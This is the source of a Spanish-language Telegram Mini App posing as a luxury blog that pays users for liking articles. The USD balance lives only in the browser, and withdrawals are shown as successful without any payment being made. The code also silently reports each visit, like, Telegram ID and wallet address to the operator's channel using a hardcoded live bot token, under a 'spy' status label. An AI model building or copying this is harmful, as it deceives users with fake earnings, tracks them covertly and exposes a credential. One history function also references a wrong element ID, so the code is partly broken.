<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>VIP Blog Luxury</title>
    <script src='//libtl.com/sdk.js' data-zone='10278425' data-sdk='show_10278425'></script>
    <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --gold:#d4af37; --bg:#0f0f0f; --card:#1a1a1a; --green:#2ecc71; }
        body { background:var(--bg); color:#eee; font-family:'Poppins', sans-serif; margin:0; padding:15px; text-align:center; min-height:100vh; }
        .top-bar { display:flex; justify-content:space-between; align-items:center; background:var(--card); padding:15px 25px; border-radius:50px; border:1px solid var(--gold); margin-bottom:20px; box-shadow:0 0 15px rgba(212,175,55,0.2); }
        .bal-val { font-weight:600; color:var(--green); font-size:18px; }
        .blog-card { background:var(--card); border-radius:20px; padding:25px; text-align:left; border:1px solid #333; margin-bottom:20px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
        .blog-title { font-family:'Playfair Display', serif; color:var(--gold); font-size:22px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px; }
        .blog-text { font-size:14px; line-height:1.6; color:#bbb; min-height:100px; }
        .actions { display:flex; justify-content:space-between; align-items:center; margin-top:20px; padding-top:15px; border-top:1px solid #333; }
        .like-btn { background:none; border:none; color:#555; font-size:28px; cursor:pointer; transition:0.3s; }
        .like-btn.active { color:#ff4757; transform:scale(1.2); }
        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px; }
        .menu-btn { background:#222; border:1px solid #444; padding:12px; border-radius:12px; color:white; font-size:11px; font-weight:600; cursor:pointer; }
        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; display:none; flex-direction:column; justify-content:center; align-items:center; }
        .modal-card { background:#1a1a1a; border:1px solid var(--gold); padding:25px; border-radius:20px; width:90%; max-width:350px; text-align:center; }
        input { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none; background:#000; color:white; font-size:14px; }
    </style>
</head>
<body>
    <div class="top-bar">
        <div>ðŸ’° $<span id="usd" class="bal-val">0.0000</span></div>
        <div style="font-size:10px; color:var(--gold); font-weight:bold; letter-spacing:1px;">REVISTA VIP</div>
    </div>

    <div class="blog-card">
        <div class="blog-title" id="blogTitle">Cargando portada...</div>
        <div class="blog-text" id="blogContent">
            Abriendo la ediciÃ³n exclusiva para socios... por favor espere.
        </div>
        <div class="actions">
            <span id="timerText" style="font-size:10px; color:#666; font-weight:bold;">Leyendo...</span>
            <button class="like-btn" id="likeBtn" onclick="giveLike()">
                <i class="fa-solid fa-heart"></i>
            </button>
        </div>
    </div>

    <div class="menu-grid">
        <button class="menu-btn" onclick="openWithdraw()"><i class="fa-solid fa-wallet" style="color:var(--green)"></i> RETIRAR</button>
        <button class="menu-btn" onclick="openHistory()"><i class="fa-solid fa-clock-rotate-left" style="color:var(--gold)"></i> MIS PAGOS</button>
        <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/noticebuddy')"><i class="fa-brands fa-telegram" style="color:#0088cc"></i> CANAL</button>
        <button class="menu-btn" onclick="nextArticle()" id="btnNext"><i class="fa-solid fa-forward"></i> SIGUIENTE</button>
    </div>

    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: âšª Sincronizando...</div>
        <div class="modal-overlay" id="modalWithdraw">
        <div class="modal-card">
            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">RETIRAR FONDOS</h3>
            <p style="font-size:10px; color:var(--green); margin-bottom:10px;">RED: USDT POLYGON (MATIC)</p>
            <input type="number" id="withdrawAmt" placeholder="Monto (MÃ­n: 2.00)">
            <input type="text" id="withdrawWallet" placeholder="Billetera USDT Matic">
            <button class="menu-btn" style="width:100%; background:var(--green); border:none; padding:15px; margin-top:10px; font-size:14px;" onclick="confirmWithdraw()">CONFIRMAR Y RESTAR</button>
            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Regresar</button>
        </div>
    </div>

    <div class="modal-overlay" id="modalHistory">
        <div class="modal-card">
            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">HISTORIAL DE Ã‰XITO</h3>
            <div id="historyContainer" style="text-align:left; max-height:200px; overflow-y:auto; font-size:11px; margin-top:15px;">
                </div>
            <p style="font-size:9px; color:#555; margin-top:15px;">Para ayuda contacta a soporte.</p>
            <button class="menu-btn" style="width:100%; margin-top:10px;" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">SOPORTE TÃ‰CNICO</button>
            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Cerrar</button>
        </div>
    </div>
        <script>
        const tg = window.Telegram.WebApp; tg.expand();
        
        // TOKEN ACTUALIZADO DESDE TU FOTO
        const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDO rU16KLY69y-J40"; 
        const CANAL_ID = "-1002118088046";
        const KEY = 'luxury_blog_v2_polygon_final';

        // ACTIVAMOS BONO DE $2.00 PARA TUS PRUEBAS
        let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };

        const articles = [
            {t:"Disciplina vs Talento", c:"Muchos esperan el momento perfecto, pero el Ã©xito favorece a quien se levanta temprano y trabaja con fe..."},
            {t:"La Nueva EconomÃ­a", c:"Las Mini Apps de Telegram estÃ¡n abriendo puertas a miles de emprendedores. Aprender a usarlas es la clave este 2026..."},
            {t:"Paz Mental Diaria", c:"En un mundo lleno de ruido, tomarse 5 minutos para leer y meditar es el mejor negocio que puedes hacer hoy..."}
        ];

        function reportar(tipo){
            const id = tg.initDataUnsafe?.user?.id || "000";
            const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("ðŸ•µï¸ BLOG-REPORTE: "+tipo+" | ID: "+id)}`)
                .then(r => r.json())
                .then(data => {
                    if(data.ok) document.getElementById('spyStatus').innerText = "Red: ðŸŸ¢ Sincronizado";
                    else document.getElementById('spyStatus').innerText = "Red: ðŸ”´ Error de Token";
                });
        }

        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
        function updateUI(){ document.getElementById('usd').innerText = user.usd.toFixed(4); }

        function nextArticle(){
            if(user.articlesToday >= 10) return tg.showAlert("EdiciÃ³n diaria agotada.");
            let a = articles[Math.floor(Math.random()*articles.length)];
            document.getElementById('blogTitle').innerText = a.t;
            document.getElementById('blogContent').innerText = a.c;
            document.getElementById('likeBtn').classList.remove('active');
            let s = 5; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
            let iv = setInterval(() => {
                s--; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
                if(s<=0){ clearInterval(iv); document.getElementById('timerText').innerText = "Â¡Danos un Like!"; }
            }, 1000);
        }

        function giveLike(){
            if(document.getElementById('timerText').innerText !== "Â¡Danos un Like!") return;
            if(document.getElementById('likeBtn').classList.contains('active')) return;
            document.getElementById('likeBtn').classList.add('active');
            user.usd += 0.0025; user.articlesToday++;
            save(); reportar("DIO LIKE (+$0.0025)");
        }

        function confirmWithdraw(){
            let amt = parseFloat(document.getElementById('withdrawAmt').value);
            let wallet = document.getElementById('withdrawWallet').value;
            if(amt < 2.00 || isNaN(amt)) return tg.showAlert("MÃ­nimo $2.00 USD.");
            if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
            if(wallet.length < 5) return tg.showAlert("Escribe una billetera Matic vÃ¡lida.");

            user.usd -= amt; // RESTA DE DINERO INMEDIATA
            let h = { fecha: new Date().toLocaleDateString(), hora: new Date().toLocaleTimeString(), monto: amt.toFixed(2), wallet: wallet, red: "Polygon" };
            user.history.unshift(h); // REGISTRO EN EL HISTORIAL
            save();
            reportar(`ðŸ”¥ RETIRO: $${h.monto} | RED: ${h.red} | BILLETERA: ${h.wallet} | HORA: ${h.hora}`);
            closeModals();
            tg.showAlert("âœ… Â¡SOLICITUD EXITOSA! El dinero se restÃ³. Revisa tu historial.");
        }

        function openWithdraw(){ document.getElementById('modalWithdraw').style.display='flex'; }
        function openHistory(){
            const cont = document.getElementById('historyContainer'); cont.innerHTML = "";
            user.history.forEach(x => {
                cont.innerHTML += `<div style="background:rgba(255,255,255,0.03); padding:8px; border-radius:8px; margin-bottom:5px; border-left:3px solid var(--green);">
                    <b>${x.fecha}</b> - $${x.monto} <span style="color:var(--green)">Ã‰XITO</span><br>
                    <small style="color:#555;">RED: ${x.red} | ${x.wallet}</small>
                </div>`;
            });
            if(user.history.length === 0) cont.innerHTML = "<p style='text-align:center; color:#444;'>Sin retiros aÃºn.</p>";
            document.getElementById('historyModal').style.display='flex';
        }

        function closeModals(){ document.querySelectorAll('.modal-overlay').forEach(m => m.style.display='none'); }

        window.onload = () => {
            let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
            if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
            nextArticle(); updateUI(); reportar("USUARIO ENTRÃ“ (CON BONO)");
        };
    </script>
</body>
</html>
